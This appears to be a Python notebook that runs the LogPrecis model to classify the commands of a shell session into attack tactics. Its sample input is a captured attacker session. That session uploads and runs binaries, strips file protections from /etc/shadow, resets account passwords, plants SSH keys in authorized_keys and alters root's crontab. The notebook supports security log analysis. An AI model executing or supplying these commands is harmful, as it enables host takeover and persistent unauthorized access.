# %%
# Load LogPrecis model
import torch 
import torch.nn.functional as F
from transformers import AutoTokenizer, AutoModelForTokenClassification

tokenizer = AutoTokenizer.from_pretrained("SmartDataPolito/logprecis")
model = AutoModelForTokenClassification.from_pretrained("SmartDataPolito/logprecis")

# %%

import pandas as pd
from collections import defaultdict

# -------------------------------
# Helper: Split command string into spans (start, end index of each command)
# -------------------------------
def commands_span(text):
    ''' Helper function that creates the commands span. Input: commands_sequence : str
    Returns: List of 2-d tuples (command_start, command_finish)'''

    cmds = [c for c in text.replace(" | ", " ; ").replace(" || ", " ; ").replace(" && ", " ; ").replace(';', " ; ").split(" ; ")]
    cmd_spans = []
    cursor = 0
    for cmd in cmds:
        start = text.find(cmd, cursor) # cursor: position to start the search
        end = start + len(cmd)
        cmd_spans.append((start, end))
        cursor = end
    return cmd_spans

# -------------------------------
# Helper: Split session or fragments of the session into a list of separate commands 
# MAY BE REDUNDANT AND NEED TO BE REMOVED
# -------------------------------


def split_session_into_commands(text):
    """
    Splits a shell session string into individual command fragments by
    normalizing common separators (|, ||, &&, ;) into semicolons, then splitting.

    Parameters:
    - text (str): A raw shell session string.

    Returns:
    - List[str]: A list of individual command fragments.
    """
    # Normalize separators to semicolons and split into fragments
    commands = [c for c in text.replace(" | ", " ; ")
                .replace(" || ", " ; ")
                .replace(" && ", " ; ")
                .replace(';', " ; ")
                .split(" ; ")]

    # Filter out any empty strings from accidental double-separators
    return [cmd for cmd in commands if cmd.strip()]

# -------------------------------
# Helper: Run model and extract softmax probabilities
# -------------------------------
def get_token_probs(model, tokenizer, text: str):
    """
    Tokenizes the input text, runs the model, and returns:
    - token offsets
    - top predicted label indices
    - top probabilities
    - all label probabilities
    """
    inputs = tokenizer(text, return_tensors="pt")

    with torch.no_grad():
        outputs = model(inputs['input_ids'])

    logits = outputs.logits
    probs = F.softmax(logits, dim=-1)
    top_probs, top_indices = torch.max(probs, dim=-1)
    inputs_with_offsets = tokenizer(text, return_offsets_mapping=True, return_tensors="pt")
    offsets = inputs_with_offsets['offset_mapping'][0][1:-1] # Skip special tokens

    return offsets, top_indices[0][1:-1], top_probs[0][1:-1], probs


# -------------------------------
# Helper: Assign each token to a command based on character offsets
# -------------------------------
def map_tokens_to_commands(offsets, command_spans):
    token_to_cmd = []
    for start, end in offsets:
        assigned_cmd = None
        for i, (cmd_start, cmd_end) in enumerate(command_spans):
            if start >= cmd_start and end <= cmd_end:
                assigned_cmd = i
                break
        token_to_cmd.append(assigned_cmd)
    return token_to_cmd

# -------------------------------
# Helper: Aggregate per-token probabilities to per-command predictions
# -------------------------------
def aggregate_command_predictions(probs, token_to_cmd, command_spans, text, model_config):
    cmd_label_probs = defaultdict(list)
    for i, cmd_idx in enumerate(token_to_cmd):
        if cmd_idx is not None:
            cmd_label_probs[cmd_idx].append(probs[0][i])

    command_preds = []
    for cmd_idx in sorted(cmd_label_probs.keys()):
        avg_probs = torch.stack(cmd_label_probs[cmd_idx]).mean(axis=0)
        pred_label_idx = torch.argmax(avg_probs).item()
        pred_label = model_config.id2label[pred_label_idx]
        confidence = avg_probs[pred_label_idx].item()
        cmd_start, cmd_end = command_spans[cmd_idx]
        command_preds.append({
            "command": text[cmd_start:cmd_end],
            "predicted_label": pred_label,
            "confidence": confidence,
            "command_span_index": cmd_idx
        })

    return pd.DataFrame(command_preds)

# -------------------------------
# Helper: Compute label spans (start/end ranges of consistent labels)
# -------------------------------
def compute_label_spans(df):
    df['label_change'] = (df['predicted_label'] != df['predicted_label'].shift()).cumsum()
    spans = df.groupby('label_change').agg(
        label=('predicted_label', 'first'),
        start_index=('label_change', lambda x: x.index[0]),
        end_index=('label_change', lambda x: x.index[-1])
    ).reset_index(drop=True)
    spans['span_length'] = spans['end_index'] - spans['start_index'] + 1
    spans['mean_confidence'] = df.groupby('label_change')['confidence'].mean().values
    return spans

# -------------------------------
# Helper: Turn the session into chunks preserving context (CHUNK IT UP!)
# -------------------------------

def chunk_commands_by_tokens(text, tokenizer, max_tokens=120, overlap=2):  # max_tokens was set to 120 arbitrarily (refine if needed)
    """
    Chunks a sequence of shell commands based on token limits using greedy packing.
    Commands longer than max_tokens are truncated.
    """
    original_commands = split_session_into_commands(text)
    truncated_commands = []

   
    for cmd in original_commands:
        tokens = tokenizer(cmd, return_length=True)
        token_len = tokens.length[0]
        if token_len > max_tokens:
            truncated = tokenizer(cmd, truncation=True, max_length=max_tokens, return_tensors="pt")
            cmd = tokenizer.decode(truncated['input_ids'][0], skip_special_tokens=True)
        truncated_commands.append(cmd)

  
    truncated_text = " ; ".join(truncated_commands) + " ;"
    cmd_spans = commands_span(truncated_text)

  
    chunk_size = 0
    chunk = []
    chunks = []

    for i, (start, end) in enumerate(cmd_spans):
        token_len = tokenizer(truncated_text[start:end], return_length=True).length[0]
        if chunk_size + token_len > max_tokens:
            chunks.append(chunk)
            chunk = chunk[-overlap:] if overlap > 0 else []
            chunk_size = sum(t[1] for t in chunk)

        chunk.append((i, token_len))
        chunk_size += token_len

    if chunk:
        chunks.append(chunk)

    
    result = []
    for chunk in chunks:
        start_idx = chunk[0][0]
        end_idx = chunk[-1][0]
        chunk_text = truncated_text[cmd_spans[start_idx][0]:cmd_spans[end_idx][1]]
        token_count = tokenizer(chunk_text, return_length=True).length[0]
        command_indices = [i for i, _ in chunk]

        result.append({
            'chunk_text': chunk_text,
            'token_count': token_count,
            'command_indices': command_indices
        })

    return result


# -------------------------------
# Helper: Turn the session into a full session (DECHUNK)
# -------------------------------

def reconstruct_session_from_chunks(chunked_commands):
    """
    Reconstructs a session from token-chunked commands with overlap,
    avoiding duplication using command indices.

    Parameters:
    - chunked_commands: List of dicts with 'chunk_text' and 'command_indices'.
    - split_session_into_commands: Function to split session into individual commands.

    Returns:
    - Reconstructed session as a single string.
    """
    reconstructed_session = ""
    seen_indices = []

    for chunk in chunked_commands:
        commands = split_session_into_commands(chunk['chunk_text'])
        for cmd, idx in zip(commands, chunk['command_indices']):
            if idx not in seen_indices:
                reconstructed_session += cmd.strip() + " ; "
                seen_indices.append(idx)

    return reconstructed_session

# -------------------------------
# MAIN FUNCTION
# -------------------------------
def analyze_text(model, tokenizer, text):
    """
    Utilizes the helper functions to 
    - Chunks 
    - Passes chunks through the labeller where we softmax the logits and chooses 
        the most probable label (on the token level)
    - Goes back from the token level to the command level by averaging all the 
        probabilities of the tokens that constitute one command
    - Then it creates a dataframe with all the commands in a chunk, their label 
    and the models confidence in that label
    - Once that is done it aggregates all results in a single dataframe and return it.
    """
    all_command_dfs = []
    seen_indices = set()

    chunk_data = chunk_commands_by_tokens(text, tokenizer) 

    for chunk in chunk_data:
        chunk_text = chunk['chunk_text']
        
        chunk_command_spans = commands_span(chunk_text)


        offsets, top_indices, top_probs, all_probs = get_token_probs(model, tokenizer, chunk_text)
        token_to_cmd = map_tokens_to_commands(offsets, chunk_command_spans) # Use chunk_command_spans here
        command_df = aggregate_command_predictions(all_probs, token_to_cmd, chunk_command_spans, chunk_text, model.config) # Use chunk_command_spans here

        # Map the command_span_index from the chunk's command spans to the original text's command indices
        original_indices_map = {i: original_idx for i, original_idx in enumerate(chunk['command_indices'])}
        command_df["cmd_idx"] = command_df["command_span_index"].map(original_indices_map)
        command_df = command_df.drop(columns=["command_span_index"])


        # Deduplicate based on seen indices
        unique_df = command_df[~command_df["cmd_idx"].isin(seen_indices)].copy() # Added .copy() to avoid SettingWithCopyWarning
        seen_indices.update(unique_df["cmd_idx"])

        all_command_dfs.append(unique_df)

    # Concatenate all unique dataframes and sort by original command index
    final_df = pd.concat(all_command_dfs, ignore_index=True)
    final_df = final_df.sort_values(by="cmd_idx").reset_index(drop=True)
    final_df = final_df.drop(columns=["cmd_idx"]) # Drop the helper column


    span_df = compute_label_spans(final_df)

    return final_df, span_df



text = (
"LC_ALL=C cat /etc/rc.local /etc/rc.d/rc.local ; LC_ALL=C crontab -l ; scp -t ~/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C ~/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C rm -f ~/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C chattr -i -a ~/.dhpcd ; LC_ALL=C rm -f ~/.dhpcd ; LC_ALL=C rmdir ~/.dhpcd ; scp -t ~/.dhpcd ; LC_ALL=C ~/.dhpcd ; LC_ALL=C echo ~ ; LC_ALL=C chattr -i -a /etc/shadow ; LC_ALL=C passwd ; LC_ALL=C passwd ; LC_ALL=C passwd test ; LC_ALL=C passwd test ; LC_ALL=C passwd oracle ; LC_ALL=C passwd oracle ; LC_ALL=C passwd test1 ; LC_ALL=C passwd test1 ; LC_ALL=C chattr +a /etc/shadow ; LC_ALL=C mkdir -p ~/.ssh ; LC_ALL=C chmod 700 ~/.ssh ; LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3/ksHNVNStA/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH ~/.ssh/authorized_keys ; LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3/ksHNVNStA/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH >> ~/.ssh/authorized_keys ; LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q/qLn5J+ggJ6um/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3 ~/.ssh/authorized_keys ; LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q/qLn5J+ggJ6um/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3 >> ~/.ssh/authorized_keys ; LC_ALL=C netstat -plnt ; LC_ALL=C ss -tln ; scp -t /dev/shm/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C /dev/shm/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C rm -f /dev/shm/aks9ewaa068ca6xvsyl3qgwtcz ; scp -t /tmp/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C /tmp/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C rm -f /tmp/aks9ewaa068ca6xvsyl3qgwtcz ; scp -t /tmp/knrm ; scp -t /tmp/r ; LC_ALL=C /tmp/knrm ; LC_ALL=C $SHELL /tmp/r ; LC_ALL=C /tmp/knrm ; LC_ALL=C $SHELL /tmp/r ; LC_ALL=C rm -f /home/admin/.dhpcd ; scp -t /home/admin/.dhpcd ; LC_ALL=C /home/admin/.dhpcd -o 127.0.0.1:4444 -B > > /dev/null /dev/null ; LC_ALL=C top -bn1 ; LC_ALL=C crontab -l ; LC_ALL=C chattr -i /var/spool/cron/crontabs/root ; LC_ALL=C crontab - ; LC_ALL=C crontab -l ; LC_ALL=C rm -f /tmp/r /tmp/knrm ;"
)

command_df, span_df = analyze_text(model, tokenizer, text)

display(command_df)
display(span_df)

# %%
